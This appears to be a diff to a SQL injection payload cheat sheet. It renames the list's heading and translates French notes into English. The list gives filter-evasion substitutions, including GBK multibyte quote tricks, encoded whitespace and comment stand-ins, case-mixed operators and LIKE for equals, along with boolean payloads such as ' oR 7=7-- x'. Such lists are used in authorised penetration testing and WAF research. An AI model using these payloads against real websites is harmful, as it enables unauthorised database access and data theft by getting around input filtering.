@@ -1,4 +1,4 @@
-Bypass
+SQLi Boolean Payloads
 ------
 1 = 1		==> 7 = 7
 seperatoR	==> ', ", GBK (%bf%27 or 1=1 --)
@@ -7,11 +7,10 @@ space 		==> %20, %09, %0a, %0b, %0c, %0d, %a0, /**/
 = 			==> lIkE
 and 		==> AnD, &&
 or 			==> oR, ||
-payloads avec et sans "limit 1"
+payloads with and without "limit 1"
 
 To add:
-Ajouter double et triple encodage
-SQLi Bypass Payloads
+double and triple encoding
 ===========================================================================
  oR 7=7
  oR 7=7-- x
